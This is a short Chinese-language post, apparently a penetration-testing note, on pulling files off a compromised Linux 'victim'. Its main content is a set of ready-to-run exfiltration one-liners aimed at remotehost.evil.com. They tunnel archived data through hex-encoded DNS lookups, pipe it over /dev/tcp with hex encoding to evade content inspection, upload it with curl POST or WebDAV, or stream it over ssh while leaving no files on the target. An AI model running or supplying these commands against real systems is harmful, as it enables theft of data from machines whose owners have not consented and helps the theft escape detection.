================
download
================

渗透到一个Linux 系统，想要下载victim上的文件，可以参考一下方法

**1、通过DNS传输数据**

tar zcf - localfolder | xxd -p -c 16 | while read line; do host $line.domain.com remotehost.evil.com; done

把打包后的数据用16进制编码，每行16字节，这样在通过dns发送到时候就不会因为超长导致出错。然后我们限制每次只发送1个ping数据包，减少发送时间。至于怎么还原，那就要看你的了。
需要DNS服务器端 抓包过滤出需要的数据

**2、通过tcp发送**

tar zcf - localfolder >/dev/tcp/remotehost.evil.com/443 

大家看这个方式是不是有点眼熟？没错，就是和弹shell的方法差不多，只不过这次我们用来传送文件。

效果和用nc传文件是一样的。假如远程服务器和网络还有内容检测的话，我们还可以对文件进行一些编码来混淆，比如用xxd命令转换成16进制 dump

tar zcf - localfolder | xxd -p >/dev/tcp/remotehost.evil.com/443  

本地服务器可以用xxd -r来还原源文件，其实除了xxd，用 base64也不错，就是有点明显……


**3、通过curl POST 提交**

tar zcf - localfolder | curl -F "data=@-" https://remotehost.evil.com/script.php

curl -F 表示通过伪表单用Post方式发送数据

当然，你还要在本地建一个script.php用来收取数据然后写入到文件才行，并且web服务器要支持ssl并且有https证书。

或者通过webdav上传(前提是上传的目录支持webdav)

curl -T localfile http://remotehost.evil.com/ 

不过curl在很多linux发行版里面都没有默认安装，所以还是有时候还是不太靠谱。

**4、通过ssh通道传输数据**

一边tar一边通过ssh传到服务器并且自动解压缩，最后会得到远程服务器上文件夹的一份完美备份，并且在目标服务器上不会写入任何文件。

tar zcf - /some/localfolder | ssh remotehost.evil.com "cd /some/path/name; tar zxpf -" 

